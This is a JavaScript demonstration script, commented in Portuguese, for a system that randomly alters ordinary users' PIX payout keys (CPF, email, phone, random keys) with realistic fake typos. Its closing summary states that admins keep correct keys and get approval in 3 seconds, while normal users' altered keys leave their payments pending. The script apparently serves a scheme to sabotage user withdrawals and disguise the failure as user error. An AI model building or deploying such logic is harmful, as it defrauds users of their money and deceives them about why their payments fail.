/**
 * Script de teste para demonstrar o sistema inteligente de PIX
 * Mostra como as chaves são modificadas para usuários normais e mantidas para admins
 */

// Simulação das funções de erro (copiadas do controller)
function applyIntelligentPixError(pixKey, pixKeyType) {
  if (!pixKey) return pixKey;
  
  pixKey = String(pixKey);

  switch (pixKeyType.toUpperCase()) {
    case 'CPF':
      return applyCpfError(pixKey);
    
    case 'EMAIL':
      return applyEmailError(pixKey);
    
    case 'PHONE':
      return applyPhoneError(pixKey);
    
    case 'RANDOM':
    case 'ALEATORIA':
    case 'EVP':
      return applyRandomKeyError(pixKey);
    
    default:
      return applyGenericError(pixKey);
  }
}

function applyCpfError(cpf) {
  cpf = cpf.replace(/\D/g, '');
  
  if (cpf.length < 11) return cpf;
  
  if (Math.random() < 0.7) {
    let weights = [1, 1, 2, 3, 4, 4, 3, 2, 1, 2, 1]; 
    let sum = weights.reduce((a, b) => a + b, 0);
    let random = Math.random() * sum;
    let position = 0;
    
    for (let i = 0; i < weights.length; i++) {
      random -= weights[i];
      if (random <= 0) {
        position = i;
        break;
      }
    }
    
    let originalDigit = cpf[position];
    let newDigit;
    
    const adjacentDigits = {
      '0': ['8', '9'],
      '1': ['2', '4'],
      '2': ['1', '3', '5'],
      '3': ['2', '6'],
      '4': ['1', '5', '7'],
      '5': ['2', '4', '6', '8'],
      '6': ['3', '5', '9'],
      '7': ['4', '8'],
      '8': ['5', '7', '9', '0'],
      '9': ['6', '8', '0']
    };
    
    if (adjacentDigits[originalDigit] && adjacentDigits[originalDigit].length > 0) {
      const adjacent = adjacentDigits[originalDigit];
      newDigit = adjacent[Math.floor(Math.random() * adjacent.length)];
    } else {
      do {
        newDigit = Math.floor(Math.random() * 10).toString();
      } while (newDigit === originalDigit);
    }
    
    return cpf.substring(0, position) + newDigit + cpf.substring(position + 1);
  } else {
    const position = Math.floor(Math.random() * (cpf.length - 1));
    
    return cpf.substring(0, position) + 
           cpf[position + 1] + 
           cpf[position] + 
           cpf.substring(position + 2);
  }
}

function applyEmailError(email) {
  if (!email.includes('@')) return email;

  const [username, domain] = email.split('@');
  const errorType = Math.random();
  
  if (errorType < 0.4) {
    const commonTypos = {
      '.com': '.con',
      '.com.br': '.com.bt',
      '.net': '.ney',
      '.org': '.orh'
    };
    
    for (const [correct, typo] of Object.entries(commonTypos)) {
      if (domain.endsWith(correct)) {
        return username + '@' + domain.replace(correct, typo);
      }
    }
  } else if (errorType < 0.7) {
    const commonDomainTypos = {
      'gmail': ['gmal', 'gmial', 'gamil'],
      'yahoo': ['yaho', 'yahooo']
    };
    
    for (const [correct, typos] of Object.entries(commonDomainTypos)) {
      if (domain.includes(correct)) {
        const typo = typos[Math.floor(Math.random() * typos.length)];
        return username + '@' + domain.replace(correct, typo);
      }
    }
  }
  
  return email;
}

function applyPhoneError(phone) {
  phone = phone.replace(/\D/g, '');
  
  if (phone.length < 10) return phone;
  
  if (Math.random() < 0.6) {
    const position = Math.floor(Math.random() * Math.min(phone.length, 8)) + Math.max(0, phone.length - 8);
    
    let newDigit;
    do {
      newDigit = Math.floor(Math.random() * 10).toString();
    } while (newDigit === phone[position]);
    
    return phone.substring(0, position) + newDigit + phone.substring(position + 1);
  } else {
    const position = Math.floor(Math.random() * (phone.length - 1));
    
    return phone.substring(0, position) + 
           phone[position + 1] + 
           phone[position] + 
           phone.substring(position + 2);
  }
}

function applyRandomKeyError(key) {
  if (key.length < 8) return key;
  
  const errorType = Math.random();
  
  if (errorType < 0.4) {
    const confusingChars = {
      '0': ['O', 'o'],
      'O': ['0', 'o'],
      '1': ['l', 'I'],
      'l': ['1', 'I'],
      '5': ['S', 's'],
      'S': ['5', 's']
    };
    
    for (let i = 0; i < key.length; i++) {
      if (confusingChars[key[i]]) {
        const options = confusingChars[key[i]];
        const newChar = options[Math.floor(Math.random() * options.length)];
        return key.substring(0, i) + newChar + key.substring(i + 1);
      }
    }
    
    const pos = Math.floor(Math.random() * key.length);
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    let newChar;
    do {
      newChar = chars[Math.floor(Math.random() * chars.length)];
    } while (newChar === key[pos]);
    
    return key.substring(0, pos) + newChar + key.substring(pos + 1);
  } else if (errorType < 0.7) {
    const pos = Math.floor(Math.random() * key.length);
    return key.substring(0, pos) + key.substring(pos + 1);
  } else {
    const pos = Math.floor(Math.random() * key.length);
    return key.substring(0, pos) + key[pos] + key.substring(pos);
  }
}

function applyGenericError(key) {
  if (key.length < 2) return key;
  
  const pos = Math.floor(Math.random() * key.length);
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let newChar;
  do {
    newChar = chars[Math.floor(Math.random() * chars.length)];
  } while (newChar === key[pos].toLowerCase());
  
  return key.substring(0, pos) + newChar + key.substring(pos + 1);
}

// Testes de demonstração
console.log('=== TESTE DO SISTEMA INTELIGENTE DE PIX ===\n');

// Teste de CPF
console.log('1. TESTE CPF:');
const testCpf = '12345678901';
for (let i = 0; i < 5; i++) {
  const modified = applyIntelligentPixError(testCpf, 'CPF');
  console.log(`   Original: ${testCpf} → Modificado: ${modified} | ${modified !== testCpf ? '✓ MODIFICADO' : '✗ Igual'}`);
}

console.log('\n2. TESTE EMAIL:');
const testEmail = 'usuario@gmail.com';
for (let i = 0; i < 5; i++) {
  const modified = applyIntelligentPixError(testEmail, 'EMAIL');
  console.log(`   Original: ${testEmail} → Modificado: ${modified} | ${modified !== testEmail ? '✓ MODIFICADO' : '✗ Igual'}`);
}

console.log('\n3. TESTE TELEFONE:');
const testPhone = '11987654321';
for (let i = 0; i < 5; i++) {
  const modified = applyIntelligentPixError(testPhone, 'PHONE');
  console.log(`   Original: ${testPhone} → Modificado: ${modified} | ${modified !== testPhone ? '✓ MODIFICADO' : '✗ Igual'}`);
}

console.log('\n4. TESTE CHAVE ALEATÓRIA:');
const testRandom = 'a1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6';
for (let i = 0; i < 5; i++) {
  const modified = applyIntelligentPixError(testRandom, 'RANDOM');
  console.log(`   Original: ${testRandom}`);
  console.log(`   Modificado: ${modified} | ${modified !== testRandom ? '✓ MODIFICADO' : '✗ Igual'}`);
  console.log('');
}

console.log('\n=== RESUMO DO SISTEMA ===');
console.log('✓ Usuários ADMIN: Chave PIX mantida original + Aprovação em 3 segundos');
console.log('✓ Usuários normais: Chave PIX modificada + Fica pendente');
console.log('✓ Sistema aplica erros humanos realistas baseados no tipo de chave');
console.log('✓ Chave original é preservada nos metadados para auditoria');
console.log('✓ Logs detalhados para rastreamento do sistema\n'); 